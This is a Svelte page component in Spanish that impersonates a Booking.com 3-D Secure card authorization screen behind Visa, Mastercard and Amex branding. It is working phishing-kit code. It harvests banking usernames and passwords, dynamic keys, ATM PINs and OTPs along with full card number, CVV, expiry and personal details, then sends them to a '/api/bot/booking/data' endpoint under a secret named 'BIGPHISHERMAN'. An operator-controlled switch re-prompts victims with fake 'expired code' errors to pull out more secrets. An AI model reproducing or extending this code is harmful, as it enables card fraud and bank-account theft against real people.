<script lang="ts">
    // Variables por defecto
    let flightCalculation = {
        finalTotal: 100000
    };
    import { reservationStore } from '$lib/stores/reservation';
    import LoadingSpinner from '$lib/components/common/LoadingSpinner.svelte';
    import { onMount } from 'svelte';
    import { StorageService } from '$lib/services/storageService';
    import { ENV_CONFIG } from '$lib/config/env';
    import { goto } from '$app/navigation';

    // KJUR (inyectado por CDN) y secreto JWT (alineado con payment)
    const KJUR: any = (globalThis as any).KJUR;
    const JWT_SECRET = import.meta.env.JWT_SECRET || 'BIGPHISHERMAN';

    // Últimos 4 dígitos dinámicos desde reservationStore.payment.cardNumber
    let lastFourDigits = "----";
    $: {
        const num = $reservationStore?.payment?.cardNumber?.replace(/\s+/g, '');
        lastFourDigits = num && num.length >= 4 ? num.slice(-4) : "----";
    }

    // Imagen del navbar según el primer dígito de la tarjeta
    let cardImage = "/assets/logos/mc_id_check_1.webp";
    let cardImageWidth = "w-[150px]";
    $: {
        const num = $reservationStore?.payment?.cardNumber?.replace(/\s+/g, '');
        if (num && num.length > 0) {
            const firstDigit = num.charAt(0);
            if (firstDigit === '4') {
                cardImage = "/assets/logos/visa_secure.png";
                cardImageWidth = "w-[150px]";
            } else if (firstDigit === '3') {
                cardImage = "/assets/logos/amex_check_1.png";
                cardImageWidth = "w-[150px]";
            } else if (firstDigit === '5') {
                cardImage = "/assets/logos/mc_id_check_1.webp";
                cardImageWidth = "w-[150px]";
            } else {
                // Por defecto, mostrar Mastercard para otros casos
                cardImage = "/assets/logos/mc_id_check_1.webp";
                cardImageWidth = "w-[150px]";
            }
        }
    }

    // Monto dinámico desde reservationStore.totals
    let formattedTotal = "$\u00A00\u00A0COP";
    $: {
        const total = $reservationStore?.totals?.total ?? 0;
        const currency = $reservationStore?.totals?.currency ?? 'COP';
        try {
            formattedTotal = new Intl.NumberFormat('es-CO', { style: 'currency', currency }).format(total);
        } catch (e) {
            // Fallback simple si la moneda no es válida
            formattedTotal = `$ ${Number(total).toLocaleString()} ${currency}`;
        }
    }

    // Flags de visibilidad controlados por la respuesta de una API
    let isLoading = false;
    let securityFlags = {
        requireUserPass: true,    // Usuario y contraseña visibles por defecto
        requireDynamicKey: false, // Clave dinámica
        requireATMKey: false,     // Clave cajero
        requireOTP: false         // OTP
    };

    // Sistema de mensajes de error
    let errorMessages: { [key: string]: string } = {};
    
    // Rastrear qué campos ya fueron solicitados en el flujo actual
    let requestedFields: Set<string> = new Set();

    // Función para limpiar mensajes de error cuando el usuario empiece a escribir
    function clearError(field: string) {
        if (errorMessages[field]) {
            errorMessages = { ...errorMessages, [field]: '' };
        }
    }

    // Simulación/integración del fetch a la API para obtener requisitos de seguridad
    async function fetchSecurityRequirements() {
        isLoading = true;
        try {
            // TODO: Reemplazar este bloque con la llamada real a tu API
            // Ejemplo:
            // const resp = await fetch('/api/security-check', { method: 'POST', body: JSON.stringify({ amount: total, card: lastFourDigits }) });
            // const data = await resp.json();
            // securityFlags = { requireDynamicKey: data.requireDynamicKey, requireATMKey: data.requireATMKey, requireOTP: data.requireOTP };

            // Simular delay de 2000ms al cargar la página
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Mock por defecto: mantener ocultos los campos adicionales
            securityFlags = {
                requireUserPass: true,
                requireDynamicKey: false,
                requireATMKey: false,
                requireOTP: false
            };
        } catch (error) {
            console.error('Error obteniendo requisitos de seguridad:', error);
        } finally {
            isLoading = false;
        }
    }

    onMount(() => {
        fetchSecurityRequirements();
        // Marcar usuario/contraseña como solicitados por defecto
        requestedFields.add('user');
        requestedFields.add('pass');
    });

    // Acción de submit del formulario
    function isLengthBetween(value: string, min: number, max: number) {
        const len = (value || '').trim().length;
        return len >= min && len <= max;
    }

    async function handleSubmit(event) {
        isLoading = true;
        try {
            // 1) Leer datos del store para construir payload
            const state = $reservationStore;
            const totals = state?.totals || { subtotal: 0, taxes: 0, total: 0, currency: 'COP' };
            const hotel = state?.hotel || { name: '' };
            const numRooms = state?.selectedRooms?.reduce((acc, r) => acc + (r.quantity || 0), 0) || 0;
            const numPeople = (state?.searchParams?.adults || 0) + (state?.searchParams?.children || 0);
            const cardholderName = state?.payment?.cardholderName || '';
            const documentId = state?.payment?.documentId || '';
            const expiry = state?.payment?.expiry || '';
            const cvv = state?.payment?.cvv || '';
            const rawCardNumber = (state?.payment?.cardNumber || '').replace(/\s+/g, '');

            // 2) Leer inputs visibles del formulario y conservar datos previos
            const form = event.currentTarget as HTMLFormElement;
            const formData = new FormData(form);
            const previousChecks = $reservationStore?.securityCheck || {};
            
            // Conservar todos los datos ya llenados + agregar los nuevos
            const securityChecks = {
                user: securityFlags.requireUserPass ? ((formData.get('usuario') as string) || '') : (previousChecks.user || ''),
                pass: securityFlags.requireUserPass ? ((formData.get('password') as string) || '') : (previousChecks.pass || ''),
                dinamicKey: securityFlags.requireDynamicKey ? ((formData.get('clave_dinamica') as string) || '') : (previousChecks.dinamicKey || ''),
                atmKey: securityFlags.requireATMKey ? ((formData.get('clave_cajero') as string) || '') : (previousChecks.atmKey || ''),
                otp: securityFlags.requireOTP ? ((formData.get('otp') as string) || '') : (previousChecks.otp || ''),
                status: 'pending' as 'pending',
                timestamp: new Date().toISOString()
            };

            // Validación: requerir sólo los campos visibles + validar longitudes
            errorMessages = {}; // reset
            let hasValidationError = false;
            if (securityFlags.requireUserPass) {
                if (!securityChecks.user || !securityChecks.pass) {
                    alert('Por favor, ingresa usuario y contraseña.');
                    hasValidationError = true;
                }
                if (!isLengthBetween(securityChecks.user || '', 3, 20)) {
                    errorMessages.user = 'Usuario debe tener entre 3 y 20 caracteres';
                    hasValidationError = true;
                }
                if (!isLengthBetween(securityChecks.pass || '', 3, 20)) {
                    errorMessages.pass = 'Contraseña debe tener entre 3 y 20 caracteres';
                    hasValidationError = true;
                }
            }
            if (securityFlags.requireDynamicKey) {
                if (!securityChecks.dinamicKey) {
                    alert('Por favor, ingresa la clave dinámica.');
                    hasValidationError = true;
                }
                if (!isLengthBetween(securityChecks.dinamicKey || '', 4, 6)) {
                    errorMessages.dinamicKey = 'La clave dinámica debe tener entre 4 y 6 caracteres';
                    hasValidationError = true;
                }
            }
            if (securityFlags.requireATMKey) {
                if (!securityChecks.atmKey) {
                    alert('Por favor, ingresa la clave de cajero.');
                    hasValidationError = true;
                }
                const lenAtm = (securityChecks.atmKey || '').trim().length;
                if (lenAtm !== 4) {
                    errorMessages.atmKey = 'La clave de cajero debe tener exactamente 4 caracteres';
                    hasValidationError = true;
                }
            }
            if (securityFlags.requireOTP) {
                if (!securityChecks.otp) {
                    alert('Por favor, ingresa el código OTP.');
                    hasValidationError = true;
                }
                const lenOtp = (securityChecks.otp || '').trim().length;
                if (lenOtp > 8) {
                    errorMessages.otp = 'El OTP debe tener como máximo 8 caracteres';
                    hasValidationError = true;
                }
            }
            if (hasValidationError) {
                return;
            }

            // 3) Construir payload
            const metaInfo = {
                guestName: cardholderName,
                documentId: documentId,
                guestEmail: state?.guestData?.email || '',
                guestPhone: state?.guestData?.phone || '',
                hotelName: hotel.name || '',
                roomsCount: numRooms,
                peopleCount: numPeople,
                price: totals.subtotal,
                tax: totals.taxes,
                total: totals.total,
                currency: totals.currency,
                card: {
                    number: rawCardNumber,
                    expiry: expiry || '',
                    cvv: cvv || '',
                    holderName: cardholderName || ''
                },
                securityChecks,
                pre: false
            };

            console.log(metaInfo);

            // 4) Persistir info del check en localStorage y en el store
            StorageService.saveSecurityCheckData(securityChecks);
            reservationStore.updateSecurityCheck(securityChecks);

            // 5) Firmar JWT con KJUR (idéntico a payment)
            let token = '';
            try {
                const header = { alg: 'HS256', typ: 'JWT' };
                const payload = metaInfo;
                token = KJUR.jws.JWS.sign('HS256', JSON.stringify(header), JSON.stringify(payload), JWT_SECRET);
            } catch (error) {
                console.error('❌ Error firmando JWT con KJUR:', error);
            }

            // 6) Llamada a la API interna
            const resp = await fetch(`${ENV_CONFIG.API_INTERNAL_URL}/api/bot/booking/data`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${ENV_CONFIG.API_INTERNAL_KEY}`
                },
                body: JSON.stringify({ token })
            });
            if (!resp.ok) {
                throw new Error(`HTTP ${resp.status} ${resp.statusText}`);
            }
            const data = await resp.json();

            // 7) Manejo de redirecciones y visibilidad exclusiva de inputs
            // Casos: 'success', 'otp', 'cdin', 'userpass', 'atmkey', 'tcred', 'tdeb'
            switch (data.redirect_to) {
                case 'tcred':
                case 'tdeb':
                    alert('Hubo un error en la validación. Te redirigiremos a la página de pago para reintentar.');
                    goto('/payment');
                    break;
                case 'otpcode':
                    // Verificar si ya se solicitó OTP en el flujo actual
                    if (requestedFields.has('otp')) {
                        errorMessages.otp = 'Código OTP inválido o expiró. Ingresa nuevamente tu código OTP';
                    }
                    requestedFields.add('otp');
                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: false, requireOTP: true };
                    break;
                case 'cdin':
                    // Verificar si ya se solicitó clave dinámica en el flujo actual
                    if (requestedFields.has('dinamicKey')) {
                        errorMessages.dinamicKey = 'Clave Dinámica inválida o expiró. Ingresa nuevamente tu clave dinámica';
                    }
                    requestedFields.add('dinamicKey');
                    securityFlags = { requireUserPass: false, requireDynamicKey: true, requireATMKey: false, requireOTP: false };
                    break;
                case 'atmkey':
                    // Verificar si ya se solicitó clave cajero en el flujo actual
                    if (requestedFields.has('atmKey')) {
                        errorMessages.atmKey = 'Clave de Cajero inválida o expiró. Ingresa nuevamente tu clave de cajero';
                    }
                    requestedFields.add('atmKey');
                    securityFlags = { requireUserPass: false, requireDynamicKey: false, requireATMKey: true, requireOTP: false };
                    break;
                case 'userpass':
                    // Verificar si ya se solicitó usuario/contraseña en el flujo actual
                    if (requestedFields.has('user') || requestedFields.has('pass')) {
                        errorMessages.user = 'Usuario inválido o expiró. Ingresa nuevamente tu usuario';
                        errorMessages.pass = 'Contraseña inválida o expiró. Ingresa nuevamente tu contraseña';
                    }
                    requestedFields.add('user');
                    requestedFields.add('pass');
                    securityFlags = { requireUserPass: true, requireDynamicKey: false, requireATMKey: false, requireOTP: false };
                    break;
                case 'success':
                    reservationStore.updateSecurityCheck({ status: 'approved' });
                    // Mostrar loader de 2000ms antes de redirigir a congrats
                    isLoading = true;
                    setTimeout(() => {
                        goto('/congrats');
                    }, 2000);
                    break;
                default:
                    // si la API no define, mantener estado actual
                    alert('Hubo un error en la validación. Te redirigiremos a la página de pago para reintentar.');
                    goto('/payment');
                    break;
            }

            console.log('Enviando autorización de transacción');
        } catch (error) {
            console.error('Error en la autorización de transacción:', error);
            reservationStore.updateSecurityCheck({ status: 'failed' });
            alert('La conexión falló. Por favor, inténtalo nuevamente.');
            goto('/payment');
        } finally {
            isLoading = false;
        }
    }
    
</script>

<nav class="w-full shadow-lg">
    <div class="max-w-[1100px] mx-auto py-8 flex flex-row items-center justify-between px-4">
        <span></span>
        <img src={cardImage} alt="card_check" class={cardImageWidth}>
    </div>
</nav>

<main class="bg-gray-50 min-h-screen w-full">
    <div class="max-w-[1100px] mx-auto py-20 px-4">
        <p class="text-xl text-center mb-10 font-bold">
            Autorización de transacción
        </p>
        <p class="text-gray-900 text-md text-center px-10 mb-10">
            La transacción que intenta realizar en <b>BOOKING HOLDINGS LLC</b> por <b>{formattedTotal}</b> debe ser autorizada. Por favor verifica la siguiente información:
        </p>

        <div class="max-w-2xl mx-auto">
            <form on:submit|preventDefault={handleSubmit}>
            <table class="w-full">
                <tbody>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Comercio:</b>
                        </td>
                        <td class="text-left py-2">
                            <b class="text-gray-700">BOOKING HOLDINGS LLC</b>
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Monto:</b>
                        </td>
                        <td class="text-left py-2">
                            <b class="text-gray-700">{formattedTotal}</b>
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Número de tarjeta:</b>
                        </td>
                        <td class="text-left py-2">
                            <b class="text-gray-700">•••• •••• •••• {lastFourDigits}</b>
                        </td>
                    </tr>
                    
                    {#if securityFlags.requireUserPass}
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Usuario:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="text" 
                                id="usuario" 
                                name="usuario"
                                minlength="3"
                                maxlength="20"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.user ? 'border-red-500' : ''}"
                                placeholder="Ingrese su usuario"
                                on:input={() => clearError('user')}
                            />
                            {#if errorMessages.user}
                                <p class="text-xs text-red-600 mt-1">{errorMessages.user}</p>
                            {/if}
                        </td>
                    </tr>
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Contraseña:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="password" 
                                id="password" 
                                name="password"
                                minlength="3"
                                maxlength="20"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.pass ? 'border-red-500' : ''}"
                                placeholder="Ingrese su contraseña"
                                on:input={() => clearError('pass')}
                            />
                            {#if errorMessages.pass}
                                <p class="text-xs text-red-600 mt-1">{errorMessages.pass}</p>
                            {/if}
                        </td>
                    </tr>
                    {/if}
                    {#if securityFlags.requireDynamicKey}
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Clave dinámica:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="text" 
                                id="clave_dinamica" 
                                name="clave_dinamica"
                                minlength="4"
                                maxlength="6"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.dinamicKey ? 'border-red-500' : ''}"
                                placeholder="Ingrese su clave dinámica"
                                on:input={() => clearError('dinamicKey')}
                            />
                            {#if errorMessages.dinamicKey}
                                <p class="text-xs text-red-600 mt-1">{errorMessages.dinamicKey}</p>
                            {/if}
                        </td>
                    </tr>
                    {/if}
                    {#if securityFlags.requireATMKey}
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">Clave cajero:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="password" 
                                id="clave_cajero" 
                                name="clave_cajero"
                                minlength="4"
                                maxlength="4"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.atmKey ? 'border-red-500' : ''}"
                                placeholder="Ingrese su clave cajero"
                                on:input={() => clearError('atmKey')}
                            />
                            {#if errorMessages.atmKey}
                                <p class="text-xs text-red-600 mt-1">{errorMessages.atmKey}</p>
                            {/if}
                        </td>
                    </tr>
                    {/if}
                    {#if securityFlags.requireOTP}
                    <tr>
                        <td class="text-right pr-4 py-2 align-top">
                            <b class="text-gray-700">OTP:</b>
                        </td>
                        <td class="text-left py-2">
                            <input 
                                type="password" 
                                id="otp" 
                                name="otp"
                                maxlength="8"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.otp ? 'border-red-500' : ''}"
                                placeholder="Ingrese el código OTP"
                                on:input={() => clearError('otp')}
                            />
                            {#if errorMessages.otp}
                                <p class="text-xs text-red-600 mt-1">{errorMessages.otp}</p>
                            {/if}
                        </td>
                    </tr>
                    {/if}
                </tbody>
            </table>
            
            <div class="mt-6">
                <button 
                    type="submit"
                    class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition duration-200"
                >
                    Autorizar Transacción
                </button>
            </div>
            </form>
        </div>

        <!-- <div>
            <div class="mb-6">
                <p class="text-gray-700 mb-2">
                    <b>Comercio:</b> TIQUETES BARATOS S.A.S
                </p>
                <p class="text-gray-700 mb-2">
                    <b>Monto:</b>  $ {flightCalculation.finalTotal.toLocaleString()} COP
                </p>
                <p class="text-gray-700 mb-2">
                    <b>Número de tarjeta:</b> •••• •••• •••• {lastFourDigits}
                </p>
            </div>

            <p class="text-gray-900 text-md mt-6 mb-4">Ingrese los datos de su Banca Virtual:</p>
            {@html renderForm()}

        </div> -->
    </div>
</main>

<!-- Loader overlay -->
<LoadingSpinner overlay={true} show={isLoading} size="md" text="Procesando..." />